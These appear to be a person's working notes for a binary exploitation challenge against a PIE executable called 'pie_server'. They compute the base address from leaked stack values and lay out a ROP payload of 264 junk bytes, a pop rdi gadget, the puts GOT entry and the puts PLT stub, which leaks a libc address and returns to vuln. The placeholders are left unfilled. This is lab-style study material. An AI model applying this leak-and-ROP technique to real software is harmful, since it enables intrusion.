4: b'0x55c4b3bf56b5\n'
15: b'0x562c1fc45224\n' main????????

19: b'0x5605a53a31f8\n' main? Probably this one, cant imagine return address for main inside enter_name function call is that far

38: b'0x562bcb5ff1f8\n' main?

43: b'0x55fbacd9e0a0\n'
47: b'0x55ba961ff0ca\n'


19:
0x5605a53a31f8 - 0x00000000000011f8 = 0x5605a53a2000 is the base?


=> 38 is 0x562bcb5ff1f8 â€“ 0x5605a53a2000 = 0x262625D1F8 for an offset??

38:
0x562bcb5ff1f8 - 0x00000000000011f8 = 0x562bcb5fe000 is the base?

=> 19 is 0x5605a53a31f8 - 0x562bcb5fe000 = a negative number so probably not


8 + 1 + 3 + 1

work:
main + 44 = ?

main + 44 offset = 0x1224

base of binary = (main + 44) - (main + 44 offset) = ? - 0x1224 = ?

plt puts stub offset = 0x1030
=> plt puts stub = base of binary + plt puts stub offset = ? + 0x1030 = ?

got puts entry offset = 0x1030 + 0x2fe2 = 0x4012
=> got puts entry = base of binary + got puts entry offset = ? + 0x4012 = ?

pop rdi offset = 0x12ab
=> pop rdi addr = base of binary + pop rdi offset = ? + 0x12ab = ?

vuln offset = 0x11d6
=> vuln return address = base of binary + vuln offset = ? + 0x11d6 = ?

payload1 = junk byte * 264 + pop rdi addr + got puts entry + plt puts stub + vuln return address

python2 -c "print('\x90'*264 + '' + '' + '' + '')"

use tail -f command so we can give new input to the process, and use stdbuf so that writing to fifo2 is not full buffered
(tail -f fifo | stdbuf -oL ./pie_server) >> fifo2

use >> to append to end of fifo

read using translate executable that i made












